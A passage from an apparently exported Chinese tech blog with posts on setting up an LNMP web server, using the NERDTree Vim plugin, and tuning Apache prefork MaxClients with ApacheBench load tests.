<span id="more"></span>

<p>具体步骤详解不诉说，这里之讲解运维部分要点，不足之处请指点！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ulimit</span> -n</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fdisk /dev/sdb1</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mke2fs -t ext4 /dev/sdb1</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">blkid</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">df</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;UUID=83d101b0-85de-42c3-b95e-7aca7b2d1396 /home ext4 defaults 0 0&quot;</span> &gt;&gt;/etc/fstab</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mount /dev/sdb1 /home</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;* soft nofile 65536 \n hard nofile 65536&quot;</span> &gt;&gt; /etc/security/limits.conf</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yum install -y wget</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yum install -y unzip</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yum install -y vim</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;set tabstop=4 set softtabstop=4 set shiftwidth=4&quot;</span> &gt;&gt; /etc/vimrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">reboot</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yum install -y screen</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">screen -S lnmp</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget -c http://soft.vpser.net/lnmp/lnmp1.3-full.tar.gz &amp;&amp; tar zxf lnmp1.3-full.tar.gz &amp;&amp; <span class="built_in">cd</span> lnmp1.3-full &amp;&amp; ./install.sh lnmp</span></span><br></pre></td></tr></table></figure>

<p>至此安装完成</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">service</span></span> vhost add ......</span><br></pre></td></tr></table></figure>

<h2 id="具体详细-shell-命令就这些，大概内容如下"><a href="#具体详细-shell-命令就这些，大概内容如下" class="headerlink" title="具体详细 shell 命令就这些，大概内容如下"></a>具体详细 shell 命令就这些，大概内容如下</h2><ol>
<li>一，更改文件内容限制为 65536 </li>
<li>二，挂载磁盘到网站目录</li>
<li>三，安装网站常用的命令</li>
<li>四，安装 LNMPWEB 服务器环境</li>
<li>五，添加域名到虚拟主机 <code>OKOKOKOKOKOK</code>，网站正常运营</li>
</ol>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Lnmp</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim 显示目录树</title>
    <url>/2016/07/vim-folder-tree/</url>
    <content><![CDATA[<h2 id="Vim-显示目录树"><a href="#Vim-显示目录树" class="headerlink" title="Vim 显示目录树"></a>Vim 显示目录树</h2><p>在 vim 如果查看目录结构，或者当前文件夹下面的文件，就需要从编辑模式跳到命令模式，运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>觉得很不方便，如果想看上层的目录，或者上层下面的另外一个目录，需要多次进行上面的操作，但是如果你可以直接显示目录树该有多爽啊。</p>
<p>这就是本文要介绍的 vim 插件 - <code>nerdtree</code></p>
<p>你可以从 vim 的网站下载到它：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy52aW0ub3JnL3NjcmlwdHMvc2NyaXB0LnBocD9zY3JpcHRfaWQ9MTY1OA==">http://www.vim.org/scripts/script.php?script_id=1658<i class="fa fa-external-link-alt"></i></span></p>
<p>下载后，解压到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/.vim</span><br></pre></td></tr></table></figure>

<p>目录，然后打开 <code>～/.vimrc</code> 文件，添加下面一行：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">nmap &lt;silent&gt; &lt;c-n&gt; <span class="symbol">:NERDTreeToggle&lt;CR&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时进入 vim，然后 ctrl + n 就会在 vim 的左边打开目录树，其实使用了 vim 的切分窗口，你可以使用移动键，和回车键来切换到不同的目录和文件。如果想隐藏目录树，再按一次</p>
<p>ctrl + n 就可以。</p>
<p>打开目录树的同时，光标会自动移动到目录树，可以使用 hjkl 来控制光标的移动，然后回车就能打开对应的文件，这种打开方式是在当前窗口中打开，也就是你当前窗口的内容暂时看不见。</p>
<p>只有关掉新打开的这个文件，才可以看到原有的文件窗口，或者你用:buffer 命令来切换到你原有的文件。如果想把这个文件在新开的 tab 中打开，使用 shift 和 t 组合键。</p>
<p>有个关于目录树操作的教程，大家可以看这个 <span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD9mZWF0dXJlPXBsYXllcl9lbWJlZGRlZCZ2PThqV0wzd1pTT2tZ">视频<i class="fa fa-external-link-alt"></i></span></p>
<p>这个功能太酷了！！！</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>apache 中 MaxClients 与 MaxRequestsPerChild 并发数</title>
    <url>/2016/08/apache-concurrency/</url>
    <content><![CDATA[<h2 id="现象描述"><a href="#现象描述" class="headerlink" title="现象描述"></a>现象描述</h2><p>因近期服务不稳定，根据现象来对 APACHE 调优，以前用 MAXCLIENTS 3000, 砖家建议后，改为 1500。</p>
<p>MaxClients 要加到多少？ 连接数理论上当然是支持越大越好，但要在服务器的能力范围内，这跟服务器的 CPU、内存、带宽等都有关系。 </p>
<span id="more"></span>

<p>最大 client 联接数的算法 查看当前的连接数可以用 <code>ps aux | grep httpd | wc -l</code></p>
<p>或者 <code>pgrep httpd|wc -l</code> 或 实时检测 HTTPD 连接数 <code>watch -n 1 -d &quot;pgrep httpd|wc -l&quot;</code></p>
<p>计算 httpd 占用内存的平均数 <code>ps aux|grep -v grep|awk &#39;/httpd/&#123;sum+=$6;n++&#125;;END &#123;print sum/n&#125;&#39;</code> <code>14446.1 14M</code> 或 top 一下，httpd 占内存 0.1%, 0.2%, 就是 8-16M, 按 16M 来。或常规按 20M 来算也成。</p>
<p>服务器内存有 8G，除去常规启动的服务大约需要一些（保守估计），就当 6G 可用，那么理论上可以支持 <code>610241024*1024/20000000 = 322</code> 个用户？ </p>
<p>那问题就出来了， 1 为何 HTTPD 占 20M 这么大？ 2TOP 时发现 JAVA 占 14% 内存 (是全部内存的 14%，还是其他)</p>
<p><code>MaxRequestsPerChild</code> 放个非 0 的较小数即可</p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>首先要了解 Apache 采用的 MPM（Multi -Processing Modules，多道处理模块） MPM 是 Apache 的核心，它的作用是管理网络连接、调度请求。</p>
<p>Apache2.0 中 MPM 分为 3 种（perfork、worker、event）。perfork 从 Apache1.3 中继承下来的，它采用的是进程管 理方式，所以它可以提供更可靠的性能和更好的兼容性。</p>
<p>worker 是 Apache2.0 中新增加的方式，它采用了线程控制方法，可以比 perfork 更节 约系统开销、处理更多的数据量，但同时兼容性并不是很好，很多旧的程序无法工作在 worker 下。</p>
<p>event 仍处于试验阶段，它为每个任务分配不同的进程 池，目前不应该采用。 通过命令 httpd -l 可以获取目前 Apache 采用的是哪种 MPM 本文仅针对 perfork 方式进行讨论</p>
<p>了解 perfork 的工作方式 查看 Apache2.0 的配置文件 httpd.conf，可以看到 perfork 的配置段，大致如下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ServerLimit</span> <span class="number">256</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">5</span></span><br><span class="line"><span class="attribute">MinSpareServers</span> <span class="number">10</span></span><br><span class="line"><span class="attribute">MaxSpareServers</span> <span class="number">15</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">256</span></span><br><span class="line"><span class="attribute">MaxRequestsPerChild</span> <span class="number">4000</span></span><br></pre></td></tr></table></figure>

<p>当 Apache 被启动时，Apache 会自动创建 StartServers 个进程，并且尽力将空闲进程数保持在 <code>MinSpareServers</code> 和 <code>MaxSpareServers</code> 之间。</p>
<p>如果空闲进程小于 <code>MinSpareServers，Apache</code> 将会以大约每秒 1 个的速度新建进程。</p>
<p>如果空闲进程小于 <code>MaxSpareServers，Apache</code> 将会删除多余的空闲进程，释放服务器资源。 </p>
<p>进程数的最大值由 MaxClients 控制，在 Apache1.3 中最大只能设置为 256，但在 Apache2.0 中，可以通过在配置开头增加 ServerLimit 项目来突破 256 的限制，此时必须 MaxClients ≤ ServerLimit ≤ 20000 MaxRequestsPerChild 用来控制每个进程在处理了多少次请求之后自动销毁，这个参数可以设置为 0 表示无限（即不销毁进程）。</p>
<p>优化 perfork 首先，对于一个负载相对较高的网站来说，256 的进程限制是不够的，如果服务器已经达到 256 的极限，那么接下去的访问就需要排队，这也就是为什么某些服务器负载不高，但是访问却很慢的原因之一。所以首先应该了解服务器在繁忙时的进程数量。 </p>
<p>通过命令 <code>ps -ef|grep httpd|wc -l</code> 可以了解到当前系统中 Apache 进程数，通过设置 ServerLimit 和 MaxClients 来达到为服务器软扩容的目的。</p>
<p>然后，在访问量高峰期，经常会出现的情况是突然之间发生非常多的并发连接，然后突然之间减少了很多访问。</p>
<p>如果 Apache 没有准备足够数量的预备进 程，那访问只能等待 Apache 每秒 1 个的新增进程，随后又要将多余的进程删除，那 Apache 只能一直忙于新建和销毁进程，大大地降低了访问速度。</p>
<p>可以适当增加 <code>StartServers、MinSpareServers、MaxSpareServers</code> 来使得 Apache 不需要一直忙于作无用功。</p>
<p>最后，强烈推荐 <code>MaxRequestsPerChild</code> 不要设置为 0，设置为非 0，可以保护 Apache 进程免遭内存泄漏的影响，因为你不知道运行在 Apache 上的应用程式在什么时候会出错导致内存泄漏。</p>
<h2 id="httpd-conf-文件配置"><a href="#httpd-conf-文件配置" class="headerlink" title="httpd.conf 文件配置"></a>httpd.conf 文件配置</h2><p>设置完之后大致是这样的：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ServerLimit</span> <span class="number">1000</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">30</span></span><br><span class="line"><span class="attribute">MinSpareServers</span> <span class="number">30</span></span><br><span class="line"><span class="attribute">MaxSpareServers</span> <span class="number">45</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">1000</span></span><br><span class="line"><span class="attribute">MaxRequestsPerChild</span> <span class="number">4000</span></span><br></pre></td></tr></table></figure>

<p>apache 修改最大连接并用 ab 网站压力测试</p>
<p>apache 2.2，使用默认配置，默认最大连接数是 150</p>
<p>首先在 <code>httpd.conf</code> 中加载 <code>httpd-mpm.conf</code> 配置（去掉前面的注释）</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Server-pool management (MPM specific)</span><br><span class="line"><span class="keyword">Include</span> <span class="keyword">conf</span>/extra/httpd-mpm.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<h2 id="httpd-mpm-conf-文件配置"><a href="#httpd-mpm-conf-文件配置" class="headerlink" title="httpd-mpm.conf 文件配置"></a>httpd-mpm.conf 文件配置</h2><p>可见的 MPM 配置在 <code>/usr/local/apache/conf/extra/httpd-mpm.conf</code>，但里面根据 httpd 的工作模式分了很多块，哪一部才是当前 httpd 的工作模式呢？</p>
<p>可通过执行 apachectl -l 来查看： <code>[root@zh888 extra]# /usr/local/apache/bin/apachectl -l</code> &#x2F;&#x2F; 因为采用静态编译 Compiled in modules:</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">core<span class="selector-class">.c</span></span><br><span class="line">mod_authn_file<span class="selector-class">.c</span></span><br><span class="line">mod_authn_default<span class="selector-class">.c</span></span><br><span class="line">mod_authz_host<span class="selector-class">.c</span></span><br><span class="line">mod_authz_groupfile<span class="selector-class">.c</span></span><br><span class="line">mod_authz_user<span class="selector-class">.c</span></span><br><span class="line">mod_authz_default<span class="selector-class">.c</span></span><br><span class="line">mod_auth_basic<span class="selector-class">.c</span></span><br><span class="line">mod_cache<span class="selector-class">.c</span></span><br><span class="line">mod_disk_cache<span class="selector-class">.c</span></span><br><span class="line">mod_mem_cache<span class="selector-class">.c</span></span><br><span class="line">mod_include<span class="selector-class">.c</span></span><br><span class="line">mod_filter<span class="selector-class">.c</span></span><br><span class="line">mod_deflate<span class="selector-class">.c</span></span><br><span class="line">mod_log_config<span class="selector-class">.c</span></span><br><span class="line">mod_env<span class="selector-class">.c</span></span><br><span class="line">mod_expires<span class="selector-class">.c</span></span><br><span class="line">mod_headers<span class="selector-class">.c</span></span><br><span class="line">mod_setenvif<span class="selector-class">.c</span></span><br><span class="line">mod_version<span class="selector-class">.c</span></span><br><span class="line">mod_proxy<span class="selector-class">.c</span></span><br><span class="line">mod_proxy_connect<span class="selector-class">.c</span></span><br><span class="line">mod_proxy_ftp<span class="selector-class">.c</span></span><br><span class="line">mod_proxy_http<span class="selector-class">.c</span></span><br><span class="line">mod_proxy_scgi<span class="selector-class">.c</span></span><br><span class="line">mod_proxy_ajp<span class="selector-class">.c</span></span><br><span class="line">mod_proxy_balancer<span class="selector-class">.c</span></span><br><span class="line">prefork<span class="selector-class">.c</span>   <span class="comment">// 才用 prefork 所以在 httpd-mpm.conf 中找到 mpm_prefork_module</span></span><br><span class="line">http_core<span class="selector-class">.c</span></span><br><span class="line">mod_mime<span class="selector-class">.c</span></span><br><span class="line">mod_status<span class="selector-class">.c</span></span><br><span class="line">mod_autoindex<span class="selector-class">.c</span></span><br><span class="line">mod_asis<span class="selector-class">.c</span></span><br><span class="line">mod_cgi<span class="selector-class">.c</span></span><br><span class="line">mod_negotiation<span class="selector-class">.c</span></span><br><span class="line">mod_dir<span class="selector-class">.c</span></span><br><span class="line">mod_actions<span class="selector-class">.c</span></span><br><span class="line">mod_userdir<span class="selector-class">.c</span></span><br><span class="line">mod_alias<span class="selector-class">.c</span></span><br><span class="line">mod_rewrite<span class="selector-class">.c</span></span><br><span class="line">mod_so.c</span><br></pre></td></tr></table></figure>

<p>所以修改连接数就在 <code>/usr/local/apache/conf/extra/httpd-mpm.conf</code> 这个文件了，打开它就找到 prefork 模式的默认配置是</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;IfModule mpm_prefork_module&gt;</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">5</span></span><br><span class="line"><span class="attribute">MinSpareServers</span> <span class="number">5</span></span><br><span class="line"><span class="attribute">MaxSpareServers</span> <span class="number">10</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">150</span></span><br><span class="line"><span class="attribute">MaxRequestsPerChild</span> <span class="number">0</span></span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure>

<p>prefork 控制进程在最初建立 “StartServers” 个子进程后，为了满足 <code>MinSpareServers</code> 设置的需要创建一个进程，等待一秒钟，继续创建两个，再等待一秒钟，继续创建四个…… 如此按指数级增加创建的进程数，最多达到每秒 32 个，直到满足 <code>MinSpareServers</code> 设置的值为止。</p>
<p>这种模式可以不必在请求到来时再产生新的进程，从而减小了系统开销以增加性能。MaxSpareServers 设置了最大的空闲进程数，如果空闲进程数大 于这个值，Apache 会自动 kill 掉一些多余进程。这个值不要设得过大，但如果设的值比 <code>MinSpareServers</code> 小，Apache 会自动把其调 整为 <code>MinSpareServers+1</code>。如果站点负载较大，可考虑同时加大 <code>MinSpareServers</code> 和 <code>MaxSpareServers。</code></p>
<p>MaxRequestsPerChild设置的是每个子进程可处理的请求数。每个子进程在处理了“MaxRequestsPerChild”个请求后将自动销毁。0意味着无限，即子进程永不销毁。</p>
<p>虽然缺省设为 0 可以使每个子进程处理更多的请求，但如果设成非零值也有两点重要的好处</p>
<ol>
<li>可防止意外的内存泄漏。 </li>
<li>在服务器负载下降的时侯会自动减少子进程数。因此，可根据服务器的负载来调整这个值。MaxClients 是这些指令中最为重要的一个，设定的是 Apache 可以同时处理的请求，是对 Apache 性能影响最大的参数。其缺省值 150 是远远不够的，如果请求总数已达到这个值（可通过 <code>ps -ef|grep httpd|wc -l</code> 来确认），那么后面的请求就要排队，直到某个已处理请求完毕。这就是系统资源还剩下很多而 HTTP 访问却很慢的主要原因。虽然理论上这个值越大，可以 处理的请求就越多，但 Apache 默认的限制不能大于 <code>256。ServerLimit</code> 指令无须重编译 Apache 就可以加大 <code>MaxClients。</code></li>
</ol>
<p>注意，虽 然通过设置 ServerLimit，我们可以把 MaxClients 加得很大，但是往往会适得其反，系统耗光所有内存。</p>
<p>以我手头的一台服务器为例：内存 2G，每个 apache 进程消耗大约 0.5%（可通过 ps aux 来确认）的内存，也就是 10M，这样，理论上这台服务器最多跑 200 个 apache 进程就会耗光系统所有内存，所以，设置 MaxClients 要慎重。</p>
<h2 id="要加到多少？"><a href="#要加到多少？" class="headerlink" title="要加到多少？"></a>要加到多少？</h2><p>连接数理论上当然是支持越大越好，但要在服务器的能力范围内，这跟服务器的 CPU、内存、带宽等都有关系。</p>
<p>查看当前的连接数可以用 <code>ps aux | grep httpd | wc -l</code></p>
<p>计算 httpd 占用内存的平均数 <code>ps aux|grep -v grep|awk &#39;/httpd/&#123;sum+=$6;n++&#125;;END &#123;print sum/n&#125;&#39;</code></p>
<p>由于基本都是静态页面，CPU 消耗很低，每进程占用内存也不算多，大约 200K。</p>
<p>假如服务器内存有 2G，除去常规启动的服务大约需要 500M（保守估计），还剩 1.5G 可用，那么理论上可以支持 <code>1.510241024*1024/200000 = 8053.06368</code></p>
<p>约 8K 个进程，支持 2W 人同时访问应该是没有问题的（能保证其中 8K 的人访问很快，其他的可能需要等待 1、2 秒才能连上，而一旦连上就会很流畅）</p>
<p>控制最大连接数的 MaxClients ，因此可以尝试配置为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;IfModule mpm_prefork_module&gt;</span></span><br><span class="line"><span class="attribute">StartServers</span> <span class="number">5</span></span><br><span class="line"><span class="attribute">MinSpareServers</span> <span class="number">5</span></span><br><span class="line"><span class="attribute">MaxSpareServers</span> <span class="number">10</span></span><br><span class="line"><span class="attribute">ServerLimit</span> <span class="number">5500</span></span><br><span class="line"><span class="attribute">MaxClients</span> <span class="number">5000</span></span><br><span class="line"><span class="attribute">MaxRequestsPerChild</span> <span class="number">100</span></span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意，MaxClients 默认最大为 250，若要超过这个值就要显式设置 <code>ServerLimit</code>，且 <code>ServerLimit</code> 要放在 MaxClients 之 前，值要不小于 MaxClients，不然重启 httpd 时会有提示。</p>
<p>重启 httpd 后，通过反复执行 <code>pgrep httpd|wc -l</code> 来观察连接数，可以看到连接数在达到 MaxClients 的设值后不再增加，但此时访问网站也很流畅，那就不用贪心再设置更高的值了，不然以后如果网站访 问突增不小心就会耗光服务器内存，可根据以后访问压力趋势及内存的占用变化再逐渐调整，直到找到一个最优的设置值。</p>
<p>(<code>MaxRequestsPerChild</code> 不能设置为 0，可能会因内存泄露导致服务器崩溃）</p>
<p>更佳最大值计算的公式：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">apache_max_process_with_good_perfermance</span> &lt; (total_hardware_memory / apache_memory_per_process ) * <span class="number">2</span></span><br><span class="line"><span class="attribute">apache_max_process</span> = apache_max_process_with_good_perfermance * <span class="number">1</span>.<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="用-usr-local-apache-bin-ab-来测试压力-不过还有一个工具叫-webbench-也可以测试。"><a href="#用-usr-local-apache-bin-ab-来测试压力-不过还有一个工具叫-webbench-也可以测试。" class="headerlink" title="用 /usr/local/apache/bin/ab 来测试压力 不过还有一个工具叫 webbench 也可以测试。"></a>用 <code>/usr/local/apache/bin/ab</code> 来测试压力 不过还有一个工具叫 webbench 也可以测试。</h2><p><code>[root@zh888 bin]# /usr/local/apache/bin/ab -n 100 -c 100 http://192.168.100.1:8000/index.php</code> &#x2F;&#x2F; 参数很多，一般我们用 -c 和 -n 参数就可以了，这个表示同时处理 100 个请求并运行 100 次 index.php 文件.</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">This is ApacheBench, Version <span class="number">2.3</span> &lt;$Revision: <span class="number">655654</span> $&gt; Copyright <span class="number">1996</span> Adam Twiss, Zeus Technology Ltd, <span class="keyword">http</span>://www.zeustech.net/ Licensed <span class="built_in">to</span> The Apache Software Foundation, <span class="keyword">http</span>://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span> (be patient).....done</span><br><span class="line"></span><br><span class="line">Server Software: Apache/<span class="number">2.2</span><span class="number">.19</span>// 平台 apache 版本 <span class="number">2.0</span><span class="number">.54</span></span><br><span class="line"></span><br><span class="line">Server Hostname: <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span>// 服务器主机名</span><br><span class="line"></span><br><span class="line">Server Port: <span class="number">8000</span>// 端口</span><br><span class="line"></span><br><span class="line">Document Path: /index.ph<span class="comment">p// 测试的页面文档</span></span><br><span class="line"></span><br><span class="line">Document Length: <span class="number">36174</span> <span class="keyword">byte</span><span class="comment">s// 文档大小</span></span><br><span class="line"></span><br><span class="line">Concurrency Level: <span class="number">100</span>// 并发数</span><br><span class="line"></span><br><span class="line">Time taken <span class="keyword">for</span> tests: <span class="number">4.482</span> <span class="keyword">second</span><span class="comment">s// 整个测试持续的时间</span></span><br><span class="line"></span><br><span class="line">Complete requests: <span class="number">100</span>// 完成的请求数量</span><br><span class="line"></span><br><span class="line">Failed requests: <span class="number">0</span>// 失败的请求数量</span><br><span class="line"></span><br><span class="line">Write errors: <span class="number">0</span> Total transferred: <span class="number">3642600</span> <span class="keyword">byte</span><span class="comment">s// 整个场景中的网络传输量</span></span><br><span class="line"></span><br><span class="line">HTML transferred: <span class="number">3617400</span> <span class="keyword">bytes</span> Requests per <span class="keyword">second</span>: <span class="number">22.31</span> [<span class="comment">#/sec] (mean)// 大家最关心的指标之一，相当于 LR 中的 每秒事务数 ，后面括号中的 mean 表示这是一个平均值</span></span><br><span class="line"></span><br><span class="line">Time per request: <span class="number">4481.929</span> [ms] (mean<span class="comment">)// 大家最关心的指标之二，相当于 LR 中的 平均事务响应时间 ，后面括号中的 mean 表示这是一个平均值 Time per request: 44.819 [ms] (mean, across all concurrent requests)// 每个请求实际运行时间的平均值</span></span><br><span class="line"></span><br><span class="line">Transfer rate: <span class="number">793.68</span> [Kbytes/<span class="built_in">sec</span>] receive<span class="comment">d// 平均每秒网络上的流量，可以帮助排除是否存在网络流量过大导致响应时间延长的问题</span></span><br><span class="line"></span><br><span class="line">Connection Times (ms<span class="comment">)// 网络上消耗的时间的分解。</span></span><br><span class="line"></span><br><span class="line">                 <span class="built_in">min</span>  mean [+/-sd] <span class="built_in">median</span>   <span class="built_in">max</span></span><br><span class="line">Connect: <span class="number">0</span> <span class="number">73</span> <span class="number">24.5</span> <span class="number">79</span> <span class="number">96</span> Processing: <span class="number">252</span> <span class="number">2542</span> <span class="number">1291.7</span> <span class="number">2590</span> <span class="number">4386</span> Waiting: <span class="number">252</span> <span class="number">2541</span> <span class="number">1292.5</span> <span class="number">2590</span> <span class="number">4384</span> Total: <span class="number">253</span> <span class="number">2615</span> <span class="number">1311.0</span> <span class="number">2671</span> <span class="number">4482</span></span><br><span class="line"></span><br><span class="line">Percentage <span class="keyword">of</span> <span class="keyword">the</span> requests served <span class="keyword">within</span> <span class="keyword">a</span> certain <span class="built_in">time</span> (ms<span class="comment">)// 整个场景中所有请求的响应情况。</span></span><br></pre></td></tr></table></figure>

<p>在场景中每个请求都有一个响应时间，其中</p>
<p>50％的用户响应时间小于 1093 毫秒，</p>
<p>60％ 的用户响应时间小于 1247 毫秒，</p>
<p>最大的响应时间小于 7785 毫秒</p>
<p>由于对于并发请求，cpu 实际上并不是同时处理的，而是按照每个请求获得的时间片逐个轮转处理的，所以基本上第一个 Time per request 时间约等于第二个 Time per request 时间乘以并发请求数</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span>% <span class="number">2671</span> <span class="number">66</span>% <span class="number">3351</span> <span class="number">75</span>% <span class="number">3923</span> <span class="number">80</span>% <span class="number">4095</span> <span class="number">90</span>% <span class="number">4358</span> <span class="number">95</span>% <span class="number">4441</span> <span class="number">98</span>% <span class="number">4472</span> <span class="number">99</span>% <span class="number">4482</span> <span class="number">100</span>% <span class="number">4482</span> (longest request)</span><br></pre></td></tr></table></figure>

<h2 id="是在使用-Apache2-2-的-ab-进行测试时遇到的问题"><a href="#是在使用-Apache2-2-的-ab-进行测试时遇到的问题" class="headerlink" title="是在使用 Apache2.2 的 ab 进行测试时遇到的问题"></a>是在使用 Apache2.2 的 ab 进行测试时遇到的问题</h2><p>使用 ab 测试的时候当 - c 并发数超过 1024 就会出错： </p>
<p>windows 下提示：<code>apr_pollset_create failed: Invalid argument (22)</code> </p>
<p>linux 下提示：s<code>ocket: Too many open files</code> </p>
<p>解决办法： linux 下 <code>ulimit -n 35768</code>（设置系统允许同时打开的文件数，系统默认是 1024），可以用 <code>ulimit -a</code> 查看 open files 项，<code>lsof |wc -l</code> 可以查看系统所有进程的文件打开数。</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">ulimit：显示（或设置）用户可以使用的资源限制 　　 　　</span><br><span class="line">ulimit -<span class="keyword">a</span> 显示用户可以使用的资源限制 　　 　　</span><br><span class="line">ulimit unlimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（<span class="built_in">max</span> <span class="built_in">open</span> <span class="built_in">files</span>）和可同时运行的最大进程数（<span class="built_in">max</span> user processes）无效</span><br><span class="line">ulimit -n &lt;可以同时打开的文件数&gt; 设置用户可以同时打开的最大文件数（<span class="built_in">max</span> <span class="built_in">open</span> <span class="built_in">files</span>）</span><br><span class="line">例如：ulimit -n <span class="number">8192</span></span><br><span class="line">如果本参数设置过小，对于并发访问量大的网站，可能会出现 too many <span class="built_in">open</span> <span class="built_in">files</span> 的错误</span><br><span class="line">ulimit -u &lt; 可以运行的最大并发进程数 &gt; 设置用户可以同时运行的最大进程数（<span class="built_in">max</span> user processes）</span><br><span class="line">例如：ulimit -u <span class="number">1024</span></span><br></pre></td></tr></table></figure>

<h2 id="apache-简介"><a href="#apache-简介" class="headerlink" title="apache 简介"></a>apache 简介</h2><p><code>Apache HTTP</code> 服务器被设计为一个强大的、灵活的能够在多种平台以及不同环境下工作的服务器。不同的平台和不同的环境经常产生不同的需求，或是为了达到同样的最 佳效果而采用不同的方法。</p>
<p>Apache 凭借它的模块化设计很好的适应了大量不同的环境。这一设计使得网站管理员能够在编译时和运行时凭借载入不同的模块来 决定服务器的不同附加功能。</p>
<p>Apache2.0 将这种模块化的设计延伸到了 web 服务器的基础功能上。这个版本带有多路处理模块 (MPM) 的选择以处理网络端口绑定、接受请求并指派子进程来处理这些请求。</p>
<p>将模块化设计延伸到这一层次主要有以下两大好处：</p>
<ul>
<li>Apache可以更简洁、更有效地支持各种操作系统。尤其是在mpm_winnt中使用本地网络特性代替Apache1.3中使用的POSIX模拟层 后，Windows版本的Apache现在具有更好的性能。这个优势借助特定的MPM同样延伸到了其他各种操作系统。</li>
<li>服务器可以为某些特定的站点进行定制。比如，需要更好伸缩性的站点可以选择象worker或event这样线程化的MPM，而需要更好的稳定性和兼容性以适应一些旧的软件的站点可以用prefork 。<br>从用户角度来看，MPM 更像其他的 Apache 模块。主要的不同在于：不论何时，必须有且仅有一个 MPM 被载入到服务器中。现有的 MPM 列表可以在模块索引中找到。</li>
</ul>
<h4 id="选择一个-MPM"><a href="#选择一个-MPM" class="headerlink" title="选择一个 MPM"></a>选择一个 MPM</h4><p>MPM 必须在编译配置时进行选择，并静态编译到服务器中。如果编译器能够确定线程功能被启用，它将会负责优化大量功能。因为一些 MPM 在 Unix 上使用了线程，而另外一些没有使用，所以如果在编译配置时选择 MPM 并静态编译进 Apache，Apache 将会有更好的表现。</p>
<p>你可以在使用 <code>configure</code> 脚本时用 <code>--with-mpm=NAME</code> 选项指定 MPM，NAME 就是你想使用的 MPM 的名称。</p>
<p>一旦服务器编译完成，就可以用 <code>./httpd -l</code> 命令来查看使用了哪个 MPM。这个命令将列出所有已经被编译到服务器中的模块，包括 MPM。</p>
<p>我们主要阐述 prefork 和 worker 这两种和性能关系最大的产品级 MPM。</p>
<p>Apache MPM prefork 一个非线程型的、预派生的 MPM</p>
